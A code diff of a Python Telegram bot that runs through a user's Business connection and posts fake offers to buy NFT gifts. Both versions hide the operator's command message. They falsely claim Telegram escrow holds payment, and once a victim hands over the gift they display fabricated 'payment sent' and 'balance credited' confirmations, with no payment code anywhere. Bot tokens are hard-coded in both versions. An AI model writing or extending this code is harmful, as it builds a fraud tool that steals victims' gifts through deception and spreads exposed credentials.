@@ -1,547 +1,456 @@
-# bot_new.py — NFT Deal Bot | aiogram 3.31+ | Business Mode
-import asyncio
-import logging
-import random
-import re
-import sqlite3
-import string
-from datetime import datetime, timedelta
-
+import asyncio, re, random, string, logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import CommandStart
 from aiogram.types import (
-    CallbackQuery, InlineKeyboardButton, Message,
-    LinkPreviewOptions
+    Message, InlineKeyboardMarkup, InlineKeyboardButton,
+    LinkPreviewOptions, BusinessConnection,
 )
-from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.exceptions import TelegramBadRequest
 
-TOKEN    = "8516600626:AAH7ZdZpIRtOJsz9SL6HwEOHmlUxSqa6y50"
-ADMIN_ID = 8926402887
+logging.basicConfig(level=logging.INFO)
 
-bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp  = Dispatcher()
+BOT_TOKEN = "8516600626:AAHkWQ2mdcqPfzR5gNe_a5uMfZB13y7P8-A"
 
-# ── БД ───────────────────────────────────────────────────────
-db = sqlite3.connect("deals.db", check_same_thread=False)
-db.row_factory = sqlite3.Row
-db.executescript("""
-CREATE TABLE IF NOT EXISTS deals (
-    order_id        TEXT PRIMARY KEY,
-    buyer_username  TEXT,
-    chat_id         INTEGER,
-    nft_url         TEXT,
-    nft_slug        TEXT,
-    nft_num         TEXT,
-    amount          INTEGER,
-    currency        TEXT DEFAULT 's',
-    status          TEXT DEFAULT 'offer',
-    created_at      TEXT,
-    biz_id          TEXT,
-    offer_msg_id    INTEGER,
-    sent_at         TEXT
-);
-CREATE TABLE IF NOT EXISTS allowed_users (
-    user_id         INTEGER PRIMARY KEY
-);
-CREATE TABLE IF NOT EXISTS allowed_usernames (
-    username        TEXT PRIMARY KEY
-);
-""")
-db.commit()
+bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher()
 
+GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
+LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
-# ── Доступ ───────────────────────────────────────────────────
-def is_allowed(user_id: int, username: str = None) -> bool:
-    if user_id == ADMIN_ID:
-        return True
-    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
-    if row:
-        return True
-    if username:
-        uname = username.lstrip("@").lower()
-        row2 = db.execute("SELECT 1 FROM allowed_usernames WHERE username=?", (uname,)).fetchone()
-        if row2:
-            return True
-    return False
-
-def add_user(value: str):
-    value = value.strip()
-    if value.lstrip("@").isdigit():
-        db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (int(value.lstrip("@")),))
-    else:
-        db.execute("INSERT OR IGNORE INTO allowed_usernames (username) VALUES (?)", (value.lstrip("@").lower(),))
-    db.commit()
-
-def remove_user(value: str):
-    value = value.strip()
-    if value.lstrip("@").isdigit():
-        db.execute("DELETE FROM allowed_users WHERE user_id=?", (int(value.lstrip("@")),))
-    else:
-        db.execute("DELETE FROM allowed_usernames WHERE username=?", (value.lstrip("@").lower(),))
-    db.commit()
-
-
-# ── Хелперы ──────────────────────────────────────────────────
-def gen_order_id() -> str:
-    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-
-def parse_nft(url: str):
-    m = re.search(r"t\.me/nft/([A-Za-z]+)-(\d+)", url)
-    if not m:
-        return None, None
-    return m.group(1), m.group(2)
-
-def get_deal(order_id: str) -> dict | None:
-    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
-    return dict(row) if row else None
-
-def upd(order_id: str, **kw):
-    for k, v in kw.items():
-        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
-    db.commit()
-
-def fmt_remaining(sent_at_str: str) -> str:
-    sent_at   = datetime.fromisoformat(sent_at_str)
-    deadline  = sent_at + timedelta(hours=6)
-    remaining = deadline - datetime.now()
-    if remaining.total_seconds() <= 0:
-        return "0 ч. 0 мин."
-    total_min = int(remaining.total_seconds() // 60)
-    h, m = divmod(total_min, 60)
-    return f"{h} ч. {m} мин."
-
-def fmt_amount(amount: int, currency: str) -> str:
-    if currency == "s":
-        return f"<b>{amount:,} ⭐️ Звёзд</b>"
-    return f"<b>{amount:,} GRAM</b>"
-
-def fmt_amount_plain(amount: int, currency: str) -> str:
-    if currency == "s":
-        return f"{amount:,} ⭐️ Звёзд"
-    return f"{amount:,} GRAM"
-
-
-# ── Тексты (из оригинала) ─────────────────────────────────────
-def offer_text(d: dict) -> str:
-    return (
-        f"Пользователь предлагает вам "
-        f"{fmt_amount(d['amount'], d['currency'])} за подарок "
-        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>.\n\n"
-        f"Оффер действителен ещё <b>{fmt_remaining(d['sent_at'])}</b>"
-    )
-
-def deal_text(d: dict) -> str:
-    if d['currency'] == 's':
-        escrow_cur = "Telegram Stars"
-        credit_str = f"<b>{d['amount']:,} ⭐️ Звёзд</b>"
-    else:
-        escrow_cur = "GRAM"
-        credit_str = f"<b>{d['amount']:,} GRAM</b>"
-
-    return (
-        f"Ордер <b>#{d['order_id']}</b>\n\n"
-        f"Покупатель зарезервировал {fmt_amount(d['amount'], d['currency'])} через эскроу-систему "
-        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
-        f"зачислены на ваш баланс {escrow_cur} сразу после передачи подарка.\n\n"
-        f"<b>Инструкция для завершения сделки:</b>\n"
-        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
-        f"2. Нажмите «Передать NFT» и выберите "
-        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
-        f"3. Подтвердите передачу подарка.\n\n"
-        f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"{credit_str} на ваш баланс. Резерв действует 24 часа."
-    )
-
-
-# ── Клавиатуры ───────────────────────────────────────────────
-def offer_kb(order_id: str):
-    kb = InlineKeyboardBuilder()
-    kb.row(
-        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
-        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}"),
-    )
-    return kb.as_markup()
-
-def deal_kb(d: dict):
-    kb = InlineKeyboardBuilder()
-    kb.row(InlineKeyboardButton(
-        text="Передать NFT ↗",
-        url=f"tg://send_gift?to={d['buyer_username']}",
-    ))
-    kb.row(InlineKeyboardButton(
-        text="Подтвердить передачу",
-        callback_data=f"confirm:{d['order_id']}",
-    ))
-    return kb.as_markup()
-
-def admin_kb(order_id: str):
-    kb = InlineKeyboardBuilder()
-    kb.row(
-        InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_ok:{order_id}"),
-        InlineKeyboardButton(text="❌ Не передан",  callback_data=f"adm_no:{order_id}"),
-    )
-    return kb.as_markup()
-
-def lp(nft_url: str) -> LinkPreviewOptions:
-    return LinkPreviewOptions(
-        url=nft_url,
-        show_above_text=True,
-        prefer_large_media=True,
-    )
-
-
-# ── Таймер оффера ────────────────────────────────────────────
-async def offer_timer(order_id: str):
-    while True:
-        await asyncio.sleep(60)
-        d = get_deal(order_id)
-        if not d or d["status"] != "offer":
-            break
-        deadline = datetime.fromisoformat(d["sent_at"]) + timedelta(hours=6)
-        if datetime.now() >= deadline:
-            upd(order_id, status="expired")
-            try:
-                await bot.edit_message_text(
-                    "Оффер истёк.",
-                    business_connection_id=d["biz_id"] or None,
-                    chat_id=d["chat_id"],
-                    message_id=d["offer_msg_id"],
-                    reply_markup=None,
-                )
-            except Exception:
-                pass
-            break
-        try:
-            await bot.edit_message_text(
-                offer_text(d),
-                business_connection_id=d["biz_id"] or None,
-                chat_id=d["chat_id"],
-                message_id=d["offer_msg_id"],
-                reply_markup=offer_kb(order_id),
-                link_preview_options=lp(d["nft_url"]),
-            )
-        except Exception:
-            pass
-
-
-# ── /start ───────────────────────────────────────────────────
-@dp.message(CommandStart())
-async def cmd_start(message: Message):
-    user_id = message.from_user.id
-    if user_id == ADMIN_ID:
-        await message.answer("👋 Добро пожаловать, админ.")
-        return
-    await message.answer(
-        "Формат команды:\n"
-        "<code>.buy https://t.me/nft/Name-123 500 s</code> — Stars\n"
-        "<code>.buy https://t.me/nft/Name-123 7373 g</code> — GRAM"
-    )
-
-
-# ── /add /remove /users ───────────────────────────────────────
-@dp.message(F.text.startswith("/add "))
-async def cmd_add(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        val = message.text.split()[1]
-        add_user(val)
-        await message.answer(f"✅ Доступ выдан: {val}")
-    except Exception:
-        await message.answer("Формат: /add 123456789 или /add @username")
-
-@dp.message(F.text.startswith("/remove "))
-async def cmd_remove(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        val = message.text.split()[1]
-        remove_user(val)
-        await message.answer(f"✅ Доступ забран: {val}")
-    except Exception:
-        await message.answer("Формат: /remove 123456789 или /remove @username")
-
-@dp.message(F.text == "/users")
-async def cmd_users(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
-    names = db.execute("SELECT username FROM allowed_usernames").fetchall()
-    if not ids and not names:
-        await message.answer("Список пуст.")
-        return
-    lines = [str(r["user_id"]) for r in ids] + ["@" + r["username"] for r in names]
-    await message.answer("Пользователи с доступом:\n" + "\n".join(lines))
-
-
-# ── .buy ─────────────────────────────────────────────────────
-CMD_RE = re.compile(
-    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)\s+(s|g)",
-    re.IGNORECASE
+E_GEM, E_TIMER, E_GIFT, E_STAR, E_CHECK, E_LOCK = (
+    "5318901904686754959", "6037268453759389862", "5773677501825945508",
+    "6028338546736107668", "5774022692642492953", "5774077015388852135",
 )
 
-@dp.message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
-@dp.business_message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
-async def cmd_buy(message: Message):
-    biz_id = message.business_connection_id
+# bcid -> {"username": str|None, "user_id": int}
+BIZ_OWNERS: dict[str, dict] = {}
 
-    if biz_id:
-        try:
-            biz_conn = await bot.get_business_connection(biz_id)
-            owner_id = biz_conn.user.id
-            if message.from_user.id != owner_id:
-                return
-            owner_username = biz_conn.user.username
-            buyer_username = owner_username or str(owner_id)
-        except Exception:
-            return
-    else:
-        buyer_username = message.from_user.username or str(message.from_user.id)
+# order_id -> dict(meta)
+PENDING: dict[str, dict] = {}
+# (bcid, gift_slug, gift_num) -> order_id
+GIFT_INDEX: dict[tuple, str] = {}
 
-    m = CMD_RE.match((message.text or "").strip())
+
+def em(i, f):
+    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'
+
+
+T = {
+    "ru": {
+        "o1": "Пользователь предлагает вам",
+        "of": "за подарок",
+        "ot": "Оффер действителен ещё 6 ч.",
+        "ofx": "Для принятия оффера передайте подарок.",
+        "ap": "за подарок",
+        "or": "Заказ",
+        "bg": "Передать подарок",
+        "st": "Звёзд",
+        "gr": "GRAM",
+        "rec": "получатель",
+        "acc": "Подарок принят",
+        "accx": "Оплата отправлена продавцу.",
+        "done": "Сделка завершена",
+    },
+    "ukr": {
+        "o1": "Користувач пропонує вам",
+        "of": "за подарунок",
+        "ot": "Пропозиція дійсна ще 6 год.",
+        "ofx": "Для прийняття пропозиції передайте подарунок.",
+        "ap": "за подарунок",
+        "or": "Замовлення",
+        "bg": "Передати подарунок",
+        "st": "Зірок",
+        "gr": "GRAM",
+        "rec": "отримувач",
+        "acc": "Подарунок прийнято",
+        "accx": "Оплату надіслано продавцю.",
+        "done": "Угоду завершено",
+    },
+    "eng": {
+        "o1": "A user offers you",
+        "of": "for the gift",
+        "ot": "Offer valid for another 6 h.",
+        "ofx": "To accept the offer, send the gift.",
+        "ap": "for the gift",
+        "or": "Order",
+        "bg": "Send gift",
+        "st": "Stars",
+        "gr": "GRAM",
+        "rec": "recipient",
+        "acc": "Gift accepted",
+        "accx": "Payment sent to seller.",
+        "done": "Deal completed",
+    },
+    "cn": {
+        "o1": "用户向您提出报价",
+        "of": "购买礼物",
+        "ot": "报价还有效 6 小时。",
+        "ofx": "要接受报价，请发送礼物。",
+        "ap": "购买礼物",
+        "or": "订单",
+        "bg": "发送礼物",
+        "st": "星",
+        "gr": "GRAM",
+        "rec": "接收者",
+        "acc": "礼物已接收",
+        "accx": "付款已发送给卖家。",
+        "done": "交易完成",
+    },
+}
+
+
+def t(l, k):
+    return T.get(l, T["ru"]).get(k, T["ru"][k])
+
+
+def get_recipient(bcid: str) -> tuple[str | None, int | None]:
+    info = BIZ_OWNERS.get(bcid)
+    if not info:
+        return None, None
+    return info.get("username"), info.get("user_id")
+
+
+def parse_command(text):
+    if not text:
+        return None
+    parts = text.strip().split()
+    if not parts:
+        return None
+    if parts[0].startswith("/"):
+        parts = parts[1:]
+    if parts and parts[0].startswith("@"):
+        parts = parts[1:]
+    if not parts:
+        return None
+
+    link, amount = None, None
+    currency, lang = "STARS", "ru"
+
+    for p in parts:
+        low = p.lower()
+        if link is None and (p.startswith("http") or p.startswith("t.me")):
+            link = p
+            continue
+        if low in LANG_TAGS:
+            if low == "ru":
+                lang = "ru"
+            elif low in ("ukr", "uk"):
+                lang = "ukr"
+            elif low in ("eng", "en"):
+                lang = "eng"
+            elif low in ("cn", "zh"):
+                lang = "cn"
+            continue
+        if low == "gram":
+            currency = "GRAM"
+            continue
+        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
+            currency = "STARS"
+            continue
+        if amount is None:
+            try:
+                amount = int(float(p.replace(",", ".")))
+            except ValueError:
+                pass
+
+    if not link or amount is None:
+        return None
+    return link, amount, currency, lang
+
+
+def parse_gift(link):
+    m = GIFT_RE.search(link)
     if not m:
-        return
-
-    nft_url  = m.group(1)
-    amount   = int(m.group(2))
-    currency = m.group(3).lower()
-
-    slug, num = parse_nft(nft_url)
-    if not slug:
-        return
-
-    # Удаляем .buy
-    try:
-        if biz_id:
-            await bot.delete_business_messages(
-                business_connection_id=biz_id,
-                message_ids=[message.message_id],
-            )
-        else:
-            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
-    except Exception as e:
-        logging.error(f"delete .buy: {e}")
-
-    order_id = gen_order_id()
-    chat_id  = message.chat.id
-    sent_at  = datetime.now().isoformat()
-
-    db.execute("""
-        INSERT INTO deals
-          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
-           amount, currency, status, created_at, biz_id, sent_at)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'offer', ?, ?, ?)
-    """, (order_id, buyer_username, chat_id, nft_url, slug, num,
-          amount, currency, sent_at, biz_id or "", sent_at))
-    db.commit()
-
-    d = get_deal(order_id)
-    send_kw = {"business_connection_id": biz_id} if biz_id else {}
-
-    try:
-        msg = await bot.send_message(
-            chat_id,
-            offer_text(d),
-            reply_markup=offer_kb(order_id),
-            link_preview_options=lp(nft_url),
-            **send_kw,
-        )
-        upd(order_id, offer_msg_id=msg.message_id)
-        asyncio.create_task(offer_timer(order_id))
-        logging.info(f"offer sent: {order_id} chat={chat_id} biz={biz_id}")
-    except Exception as e:
-        logging.error(f"SEND OFFER ERROR: {e!r}")
-        return
-
-    try:
-        await bot.send_message(
-            ADMIN_ID,
-            f"📤 <b>Новый оффер отправлен</b>\n\n"
-            f"Ордер: <b>{order_id}</b>\n"
-            f"NFT: <b>{slug} #{num}</b>\n"
-            f"Сумма: <b>{fmt_amount_plain(amount, currency)}</b>\n"
-            f"От: @{buyer_username}\n"
-            f"Ссылка: {nft_url}",
-        )
-    except Exception as e:
-        logging.error(f"admin offer notify: {e}")
+        return None
+    slug, num = m.group(1), m.group(2)
+    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
+    return name, num, slug
 
 
-# ── Принять ──────────────────────────────────────────────────
-@dp.callback_query(F.data.startswith("accept:"))
-async def cb_accept(call: CallbackQuery):
-    order_id = call.data.split(":")[1]
-    d = get_deal(order_id)
-    if not d or d["status"] != "offer":
-        await call.answer("Оффер недоступен.", show_alert=True)
-        return
+def amount_line(amount, currency, lang):
+    if currency == "GRAM":
+        return f'{em(E_GEM, "💎")} <b>{amount} {t(lang, "gr")}</b>'
+    return f'{em(E_STAR, "⭐")} <b>{amount} {t(lang, "st")}</b>'
 
-    upd(order_id, status="active")
-    await call.answer(
-        "Внимание!\n\n"
-        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
-        "Нажмите «ОК», если вы прочитали это сообщение.",
-        show_alert=True
+
+def rec_tag(username: str | None, user_id: int | None) -> str:
+    if username:
+        return f"@{username}"
+    if user_id:
+        return f'<a href="tg://user?id={user_id}">id{user_id}</a>'
+    return "—"
+
+
+def build_offer_plain(amount, currency, gift_name, gift_num, order_id, lang, username, user_id):
+    return (
+        f'{em(E_GIFT, "🎁")} {t(lang, "o1")}\n'
+        f'{amount_line(amount, currency, lang)} {t(lang, "of")} <b>{gift_name} #{gift_num}</b>.\n\n'
+        f'{em(E_TIMER, "⏱")} {t(lang, "ot")}\n'
+        f'{em(E_LOCK, "🔒")} {t(lang, "ofx")}\n\n'
+        f'<i>{t(lang, "or")} #{order_id}, {t(lang, "rec")} {rec_tag(username, user_id)}</i>'
     )
 
-    biz_id = d["biz_id"] or None
+
+def build_offer_linked(amount, currency, gift_name, gift_num, order_id, lang, url, username, user_id):
+    return (
+        f'{em(E_GIFT, "🎁")} {t(lang, "o1")}\n'
+        f'{amount_line(amount, currency, lang)} {t(lang, "of")} '
+        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
+        f'{em(E_TIMER, "⏱")} {t(lang, "ot")}\n'
+        f'{em(E_LOCK, "🔒")} {t(lang, "ofx")}\n\n'
+        f'<i>{t(lang, "or")} #{order_id}, {t(lang, "rec")} {rec_tag(username, user_id)}</i>'
+    )
+
+
+def build_offer_accepted(amount, currency, gift_name, gift_num, order_id, lang, url):
+    return (
+        f'{em(E_CHECK, "✅")} <b>{t(lang, "acc")}</b>\n'
+        f'{amount_line(amount, currency, lang)} {t(lang, "ap")} '
+        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
+        f'{em(E_LOCK, "🔒")} {t(lang, "accx")}\n\n'
+        f'<i>{t(lang, "or")} #{order_id} — {t(lang, "done")}</i>'
+    )
+
+
+def make_offer_keyboard(lang, username: str | None, user_id: int | None):
+    if username:
+        url = f"tg://send_gift?to={username}"
+    elif user_id:
+        url = f"tg://user?id={user_id}"
+    else:
+        url = "tg://settings"
+    return InlineKeyboardMarkup(
+        inline_keyboard=[[
+            InlineKeyboardButton(
+                text=t(lang, "bg"),
+                url=url,
+                icon_custom_emoji_id=E_GIFT,
+            )
+        ]]
+    )
+
+
+def oid():
+    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+
+
+def extract_gift_ref(message: Message):
+    for attr in ("unique_gift", "gift"):
+        obj = getattr(message, attr, None)
+        if obj is None:
+            continue
+        g = getattr(obj, "gift", obj)
+        name = getattr(g, "name", None) or getattr(g, "title", None)
+        num = getattr(g, "number", None)
+        if name and num is not None:
+            slug = name.replace(" ", "")
+            return slug, str(num)
+
+    txt = (message.text or message.caption or "")
+    m = GIFT_RE.search(txt)
+    if m:
+        return m.group(1), m.group(2)
+
+    for ent_list in (message.entities or [], message.caption_entities or []):
+        for ent in ent_list:
+            url = getattr(ent, "url", None) or ""
+            m = GIFT_RE.search(url)
+            if m:
+                return m.group(1), m.group(2)
+
+    return None
+
+
+async def try_finalize(message: Message, bcid: str):
+    ref = extract_gift_ref(message)
+    if not ref:
+        return False
+    slug, num = ref
+    order_id = GIFT_INDEX.get((bcid, slug, num))
+    if not order_id:
+        return False
+    meta = PENDING.get(order_id)
+    if not meta:
+        return False
+
     try:
         await bot.edit_message_text(
-            deal_text(d),
-            business_connection_id=biz_id,
-            chat_id=d["chat_id"],
-            message_id=d["offer_msg_id"],
-            reply_markup=deal_kb(d),
-            link_preview_options=lp(d["nft_url"]),
+            chat_id=meta["chat_id"],
+            message_id=meta["msg_id"],
+            text=build_offer_accepted(
+                meta["amount"], meta["currency"],
+                meta["gift_name"], meta["gift_num"],
+                order_id, meta["lang"], meta["nft_url"],
+            ),
+            reply_markup=None,
+            business_connection_id=bcid,
+            link_preview_options=LinkPreviewOptions(
+                is_disabled=False,
+                prefer_large_media=True,
+                show_above_text=False,
+            ),
+        )
+    except TelegramBadRequest as e:
+        logging.error(f"finalize edit: {e}")
+        return False
+
+    PENDING.pop(order_id, None)
+    GIFT_INDEX.pop((bcid, slug, num), None)
+    return True
+
+
+async def ensure_owner(bcid: str):
+    """Если BIZ_OWNERS пуст (бот стартанул после подключения) — подтягиваем вручную."""
+    if bcid in BIZ_OWNERS:
+        return
+    try:
+        bc = await bot.get_business_connection(bcid)
+        BIZ_OWNERS[bcid] = {
+            "username": bc.user.username,
+            "user_id": bc.user.id,
+        }
+        logging.info(
+            f"biz_conn FETCHED: bcid={bcid} user_id={bc.user.id} username={bc.user.username}"
         )
     except Exception as e:
-        logging.error(f"edit to deal: {e}")
-
-    # Отправляем карточку сделки покупателю отдельно (без biz_id)
-    if biz_id:
-        try:
-            await bot.send_message(
-                d["chat_id"],
-                deal_text(d),
-                reply_markup=deal_kb(d),
-                link_preview_options=lp(d["nft_url"]),
-            )
-        except Exception as e:
-            logging.error(f"send deal to buyer: {e}")
+        logging.error(f"get_business_connection failed: {e}")
 
 
-# ── Отклонить ────────────────────────────────────────────────
-@dp.callback_query(F.data.startswith("decline:"))
-async def cb_decline(call: CallbackQuery):
-    order_id = call.data.split(":")[1]
-    d = get_deal(order_id)
-    if not d:
+@dp.business_connection()
+async def handle_business_connection(bc: BusinessConnection):
+    user = bc.user
+    if bc.is_enabled:
+        BIZ_OWNERS[bc.id] = {
+            "username": user.username,
+            "user_id": user.id,
+        }
+        logging.info(
+            f"biz_conn ON: bcid={bc.id} user_id={user.id} username={user.username}"
+        )
+    else:
+        BIZ_OWNERS.pop(bc.id, None)
+        logging.info(f"biz_conn OFF: bcid={bc.id}")
+
+
+@dp.business_message()
+async def handle_business_message(message: Message):
+    bcid = message.business_connection_id
+    if not bcid:
         return
 
-    upd(order_id, status="declined")
-    await call.answer("Вы отклонили оффер.")
+    await ensure_owner(bcid)
 
-    biz_id = d["biz_id"] or None
+    if await try_finalize(message, bcid):
+        return
+
+    if not message.text:
+        return
+
+    parsed = parse_command(message.text)
+    if not parsed:
+        return
+
+    username, user_id = get_recipient(bcid)
+    if not username and not user_id:
+        logging.warning(f"no owner info for bcid={bcid}, skipping offer")
+        return
+
+    link, amount, currency, lang = parsed
+    gift = parse_gift(link)
+    if not gift:
+        return
+    gift_name, gift_num, slug = gift
+    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
+    order_id = oid()
+
     try:
-        await bot.edit_message_text(
-            f"Оффер на NFT <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a> отменён.",
-            business_connection_id=biz_id,
-            chat_id=d["chat_id"],
-            message_id=d["offer_msg_id"],
-            reply_markup=None,
+        sent = await bot.send_message(
+            chat_id=message.chat.id,
+            text=build_offer_plain(
+                amount, currency, gift_name, gift_num, order_id, lang,
+                username, user_id,
+            ),
+            reply_markup=make_offer_keyboard(lang, username, user_id),
+            business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
     except Exception as e:
-        logging.error(f"edit decline: {e}")
-
-
-# ── Подтвердить передачу ─────────────────────────────────────
-@dp.callback_query(F.data.startswith("confirm:"))
-async def cb_confirm(call: CallbackQuery):
-    order_id = call.data.split(":")[1]
-    d = get_deal(order_id)
-    if not d or d["status"] != "active":
-        await call.answer("Ордер недоступен.", show_alert=True)
+        logging.error(f"send error: {e}")
         return
 
-    await call.answer(
-        "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
-        show_alert=True
+    try:
+        await bot.delete_business_messages(
+            business_connection_id=bcid,
+            message_ids=[message.message_id],
+        )
+    except Exception as e:
+        logging.error(f"del: {e}")
+
+    PENDING[order_id] = {
+        "chat_id": message.chat.id,
+        "msg_id": sent.message_id,
+        "bcid": bcid,
+        "amount": amount,
+        "currency": currency,
+        "gift_name": gift_name,
+        "gift_num": gift_num,
+        "gift_slug": slug,
+        "lang": lang,
+        "nft_url": nft_url,
+        "username": username,
+        "user_id": user_id,
+    }
+    GIFT_INDEX[(bcid, slug, gift_num)] = order_id
+
+    await asyncio.sleep(1.5)
+    try:
+        await bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=sent.message_id,
+            text=build_offer_linked(
+                amount, currency, gift_name, gift_num, order_id, lang, nft_url,
+                username, user_id,
+            ),
+            reply_markup=make_offer_keyboard(lang, username, user_id),
+            business_connection_id=bcid,
+            link_preview_options=LinkPreviewOptions(
+                is_disabled=False,
+                prefer_large_media=True,
+                show_above_text=False,
+            ),
+        )
+    except TelegramBadRequest as e:
+        logging.error(f"edit error: {e}")
+
+
+@dp.edited_business_message()
+async def handle_edited_business_message(message: Message):
+    bcid = message.business_connection_id
+    if not bcid:
+        return
+    await try_finalize(message, bcid)
+
+
+@dp.message(CommandStart())
+async def cmd_start(message: Message):
+    await message.answer(
+        "🎁 Пришли ссылку на подарок, язык и сумму, например:\n"
+        "https://t.me/nft/PreciousPeach-664 ru 21222 STARS"
     )
-
-    try:
-        await bot.send_message(
-            ADMIN_ID,
-            f"🔔 Попытка подтверждения\n\n"
-            f"Ордер: <b>{d['order_id']}</b>\n"
-            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
-            f"Сумма: <b>{fmt_amount_plain(d['amount'], d['currency'])}</b>\n"
-            f"Покупатель: @{d['buyer_username']}\n"
-            f"Ссылка: {d['nft_url']}\n\n"
-            f"Нажми если NFT реально передан:",
-            reply_markup=admin_kb(order_id),
-        )
-    except Exception as e:
-        logging.error(f"admin notify: {e}")
-
-
-# ── Админ: подтвердить ───────────────────────────────────────
-@dp.callback_query(F.data.startswith("adm_ok:"))
-async def cb_adm_ok(call: CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-    order_id = call.data.split(":")[1]
-    d = get_deal(order_id)
-    if not d:
-        return
-
-    upd(order_id, status="completed")
-    await call.answer("Подтверждено.")
-    await call.message.edit_reply_markup(reply_markup=None)
-    await call.message.answer(f"Ордер {order_id} завершён.")
-
-    biz_id = d["biz_id"] or None
-    try:
-        await bot.send_message(
-            d["chat_id"],
-            f"Передача подтверждена!\n\n"
-            f"Ордер <b>{d['order_id']}</b>\n"
-            f"{fmt_amount(d['amount'], d['currency'])} зачислены на ваш баланс.",
-            business_connection_id=biz_id,
-        )
-    except Exception as e:
-        logging.error(e)
-
-
-# ── Админ: не передан ────────────────────────────────────────
-@dp.callback_query(F.data.startswith("adm_no:"))
-async def cb_adm_no(call: CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-    order_id = call.data.split(":")[1]
-    d = get_deal(order_id)
-    if not d:
-        return
-
-    upd(order_id, status="active")
-    await call.answer("Отклонено.")
-    await call.message.edit_reply_markup(reply_markup=None)
-
-    biz_id = d["biz_id"] or None
-    try:
-        await bot.edit_message_reply_markup(
-            business_connection_id=biz_id,
-            chat_id=d["chat_id"],
-            message_id=d["offer_msg_id"],
-            reply_markup=deal_kb(d),
-        )
-    except Exception as e:
-        logging.error(e)
-
-
-# ── Catch-all ────────────────────────────────────────────────
-@dp.message()
-async def catch_all(message: Message):
-    pass
 
 
 async def main():
-    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
     await dp.start_polling(
         bot,
-        skip_updates=True,
         allowed_updates=[
-            "message",
-            "callback_query",
             "business_connection",
             "business_message",
             "edited_business_message",
-            "deleted_business_messages",
         ],
     )
+
 
 if __name__ == "__main__":
     asyncio.run(main())
